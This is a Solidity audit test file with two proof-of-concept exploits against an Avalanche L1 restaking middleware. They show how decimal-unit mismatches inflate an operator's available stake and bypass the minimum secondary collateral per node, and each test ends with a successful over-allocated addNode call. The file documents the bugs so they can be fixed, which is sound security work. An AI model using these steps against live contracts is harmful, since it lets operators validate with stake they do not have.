// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {MiddlewareTestBase} from "./MiddlewareTestBase.t.sol";

import {AvalancheL1Middleware, AvalancheL1MiddlewareSettings} from
    "../../src/contracts/middleware/AvalancheL1Middleware.sol";
import {MiddlewareVaultManager} from "../../src/contracts/middleware/MiddlewareVaultManager.sol";
import {VaultTokenized} from "../../src/contracts/vault/VaultTokenized.sol";
import {L1RestakeDelegator} from "../../src/contracts/delegator/L1RestakeDelegator.sol";
import {IVaultTokenized} from "../../src/interfaces/vault/IVaultTokenized.sol";
import {IBaseDelegator} from "../../src/interfaces/delegator/IBaseDelegator.sol";
import {IL1RestakeDelegator} from "../../src/interfaces/delegator/IL1RestakeDelegator.sol";
import {IBalancerValidatorManager} from
    "@suzaku/contracts-library/interfaces/ValidatorManager/IBalancerValidatorManager.sol";
import {BalancerValidatorManager} from
    "@suzaku/contracts-library/contracts/ValidatorManager/BalancerValidatorManager.sol";

import {ERC20WithDecimals} from "../mocks/MockERC20WithDecimals.sol";
import {Time} from "@openzeppelin/contracts/utils/types/Time.sol";

contract pocAuditOctane is MiddlewareTestBase {
    /// POC 1: available stake inflation when primary collateral has 6 decimals.
    function test_POC_AvailableStakeInflated_Primary6Decimals() public {
        // --- 6-dec primary token and vault ---
        ERC20WithDecimals usdc6Dec = new ERC20WithDecimals("USDC6", "USDC6", 6);

        uint48 epochDuration = 4 hours;
        address vImplOwner = bob;
        address vault6DecAddress = vaultFactory.create(
            vaultFactory.lastVersion(),
            vImplOwner,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(usdc6Dec),
                    burner: address(0xdEaD),
                    epochDuration: epochDuration,
                    depositWhitelist: false,
                    isDepositLimit: false,
                    depositLimit: 0,
                    defaultAdminRoleHolder: bob,
                    depositWhitelistSetRoleHolder: bob,
                    depositorWhitelistRoleHolder: bob,
                    isDepositLimitSetRoleHolder: bob,
                    depositLimitSetRoleHolder: bob,
                    name: "USDC6 Vault",
                    symbol: "USDC6V"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)
        );
        VaultTokenized vault6Dec = VaultTokenized(vault6DecAddress);

        // Delegator for vault6
        address[] memory l1LimitSetRoleHolders = new address[](1);
        l1LimitSetRoleHolders[0] = bob;
        address[] memory operatorL1SharesSetRoleHolders = new address[](1);
        operatorL1SharesSetRoleHolders[0] = bob;

        address delegator6DecAddress = delegatorFactory.create(
            0,
            abi.encode(
                vault6DecAddress,
                abi.encode(
                    IL1RestakeDelegator.InitParams({
                        baseParams: IBaseDelegator.BaseParams({
                            defaultAdminRoleHolder: bob,
                            hook: address(0),
                            hookSetRoleHolder: bob
                        }),
                        l1LimitSetRoleHolders: l1LimitSetRoleHolders,
                        operatorL1SharesSetRoleHolders: operatorL1SharesSetRoleHolders
                    })
                )
            )
        );
        L1RestakeDelegator delegator6Dec = L1RestakeDelegator(delegator6DecAddress);

        vm.prank(bob);
        vault6Dec.setDelegator(delegator6DecAddress);

        // Operator opt-ins for this new vault
        _optInOperatorVault(alice, vault6DecAddress);

        // Deposit 1,000 units (U = 6 decimals)
        uint256 depositAmount = 1_000 * 10**6;
        usdc6Dec.transfer(staker, depositAmount);
        vm.startPrank(staker);
        usdc6Dec.approve(vault6DecAddress, depositAmount);
        (uint256 depositUsed, uint256 mintedShares) = vault6Dec.deposit(staker, depositAmount);
        vm.stopPrank();
        assertEq(depositUsed, depositAmount);

        // L1 limit ≥ deposit
        // _setL1Limit(bob, balancer, 1, 5_000 * 10**6, delegator6Dec);
        // _setOperatorL1Shares(bob, balancer, 1, alice, mintedShares, delegator6Dec);
        // NOTE: don't set L1 limit yet (maxL1Limit must be set by middleware via registerVault)

        // --- New middleware with 6-dec primary ---
        AvalancheL1MiddlewareSettings memory middlewareSettings = AvalancheL1MiddlewareSettings({
            balancer: balancer,
            operatorRegistry: address(operatorRegistry),
            vaultRegistry: address(vaultFactory),
            operatorL1Optin: address(operatorL1OptInService),
            epochDuration: 4 hours,
            slashingWindow: 5 hours,
            stakeUpdateWindow: 3 hours
        });

        // scaleFactor in U; require scaleFactor ≤ minStake in constructor
        uint256 minStakeAmount = 1_000_000; // 1 token
        uint256 maxStakeAmount = 1_000_000_000_000_000; // large
        uint256 scaleFactor = 1_000_000; // 1e6

        AvalancheL1Middleware middleware6Dec = new AvalancheL1Middleware(
            middlewareSettings,
            l1Owner,  // l1Owner owns middleware
            address(usdc6Dec),
            maxStakeAmount,
            minStakeAmount,
            scaleFactor
        );

        // Vault manager for middleware6Dec
        MiddlewareVaultManager vaultManager6Dec = new MiddlewareVaultManager(address(vaultFactory), l1Owner, address(middleware6Dec), 24);
        vm.prank(l1Owner);
        middleware6Dec.setVaultManager(address(vaultManager6Dec));

        // Keep middleware and vaultManager owned by the l1Owner
        // Do NOT transfer ownership to anyone else as per the new architecture

        // Register middleware6Dec as a security module with **maxWeight = 2000** → capU = 2000 * scaleFactor = 2,000e6
        {
            vm.prank(l1Owner);
            BalancerValidatorManager(balancer).setUpSecurityModule(address(middleware6Dec), uint64(2000));
        }

        // Skip L1 registration since balancer is already registered in base setUp
        // _registerL1(balancer, address(middleware6Dec));

        // Register vault6Dec for class 1 in middleware6Dec
        vm.startPrank(l1Owner);  // vaultManager6Dec is owned by the l1Owner
        vaultManager6Dec.registerVault(vault6DecAddress, 1, 10_000 * 10**6);
        vm.stopPrank();

        // Register operator in middleware6Dec
        vm.startPrank(l1Owner);  // middleware6Dec is owned by the l1Owner
        middleware6Dec.registerOperator(alice);
        vm.stopPrank();

        // Now that maxL1Limit is set by registerVault, set per‑L1 limit & shares on delegator
        // bob is the delegator owner (defaultAdminRoleHolder), so he can set limits
        vm.startPrank(bob);
        delegator6Dec.setL1Limit(balancer, 1, 5_000 * 10**6);
        delegator6Dec.setOperatorL1Shares(balancer, 1, alice, mintedShares);
        vm.stopPrank();
        // Move to next middleware6Dec epoch so vault/operator are active for stake accounting
        uint48 nextMw6Epoch = middleware6Dec.getCurrentEpoch() + 1;
        vm.warp(middleware6Dec.getEpochStartTs(nextMw6Epoch) + 1);
        middleware6Dec.calcAndCacheNodeStakeForAllOperators();

        // totalStake18 = 1,000e18 while capU = 2,000e6 → available stake becomes 2,000e6 (inflated)
        uint256 availableStake = middleware6Dec.getOperatorAvailableStake(alice);
        assertEq(availableStake, 2_000 * 10**6, "inflated to module cap in U");

        // Prove exploitability: add node with 1,500e6 though real vault stake is only 1,000e6
        bytes32 nodeId = keccak256("inflation-node");
        vm.prank(alice);
        middleware6Dec.addNode(
            nodeId,
            new bytes(48),
            _pOwner1(alice),
            _pOwner1(alice),
            1_500 * 10**6
        );
        // Success proves over-allocation beyond real stake.
    }

    /// POC 2: secondary min per-node bypass when secondary collateral has 6 decimals.
    function test_POC_MinSecondaryBypass_6Decimals() public {
        // Secondary token with 6 decimals
        ERC20WithDecimals usdc6Dec = new ERC20WithDecimals("USDC6", "USDC6", 6);

        // Create vault for secondary class
        address vaultUSDCAddress = vaultFactory.create(
            vaultFactory.lastVersion(),
            bob,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(usdc6Dec),
                    burner: address(0xdEaD),
                    epochDuration: 8 hours,
                    depositWhitelist: false,
                    isDepositLimit: false,
                    depositLimit: 0,
                    defaultAdminRoleHolder: bob,
                    depositWhitelistSetRoleHolder: bob,
                    depositorWhitelistRoleHolder: bob,
                    isDepositLimitSetRoleHolder: bob,
                    depositLimitSetRoleHolder: bob,
                    name: "USDC6 Sec",
                    symbol: "USDC6S"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)
        );
        VaultTokenized vaultUSDC6Dec = VaultTokenized(vaultUSDCAddress);

        // Delegator for secondary vault
        address[] memory l1LimitSetRoleHolders = new address[](1);
        l1LimitSetRoleHolders[0] = bob;
        address[] memory operatorL1SharesSetRoleHolders = new address[](1);
        operatorL1SharesSetRoleHolders[0] = bob;

        address delegatorUSDCAddress = delegatorFactory.create(
            0,
            abi.encode(
                vaultUSDCAddress,
                abi.encode(
                    IL1RestakeDelegator.InitParams({
                        baseParams: IBaseDelegator.BaseParams({
                            defaultAdminRoleHolder: bob,
                            hook: address(0),
                            hookSetRoleHolder: bob
                        }),
                        l1LimitSetRoleHolders: l1LimitSetRoleHolders,
                        operatorL1SharesSetRoleHolders: operatorL1SharesSetRoleHolders
                    })
                )
            )
        );
        L1RestakeDelegator delegatorUSDC = L1RestakeDelegator(delegatorUSDCAddress);

        vm.prank(bob);
        vaultUSDC6Dec.setDelegator(delegatorUSDCAddress);

        // Add secondary class with min per-node = 100 USDC (U = 100e6)
        uint96 secClass = 42;
        vm.startPrank(l1Owner);
        middleware.addCollateralClass(secClass, 100 * 10**6, 0, address(usdc6Dec));
        middleware.activateSecondaryCollateralClass(secClass);
        // Register the vault in that class
        vaultManager.registerVault(vaultUSDCAddress, secClass, 10_000 * 10**6);
        vm.stopPrank();

        // Opt-in operator to this vault
        _optInOperatorVault(alice, vaultUSDCAddress);

        // Give Alice only 50 USDC (insufficient) but bug will pass
        uint256 depositAmount = 50 * 10**6;
        usdc6Dec.transfer(staker, depositAmount);
        vm.startPrank(staker);
        usdc6Dec.approve(vaultUSDCAddress, depositAmount);
        (uint256 depositUsed, uint256 shares) = vaultUSDC6Dec.deposit(staker, depositAmount);
        vm.stopPrank();
        assertEq(depositUsed, depositAmount);

        // bob is the delegator owner (defaultAdminRoleHolder), so he can set limits
        vm.startPrank(bob);
        delegatorUSDC.setL1Limit(balancer, secClass, 1_000 * 10**6);
        delegatorUSDC.setOperatorL1Shares(balancer, secClass, alice, shares);
        vm.stopPrank();

        // Advance one epoch so the newly registered secondary vault counts this epoch
        {
            uint48 nextEpoch = middleware.getCurrentEpoch() + 1;
            vm.warp(middleware.getEpochStartTs(nextEpoch) + 1);
        }
        middleware.calcAndCacheNodeStakeForAllOperators();
        _ensureFreeStake(alice);

        // Try to add a node; should FAIL if units matched, but succeeds due to 18-dec vs U mix
        bytes32 nodeId = keccak256("secondary-bypass-node");
        vm.prank(alice);
        middleware.addNode(
            nodeId,
            new bytes(48),
            _pOwner1(alice),
            _pOwner1(alice),
            0 // will use min primary internally; secondary check should gate but doesn't
        );
        // Success proves min-secondary bypass with 6-dec class.
    }
}
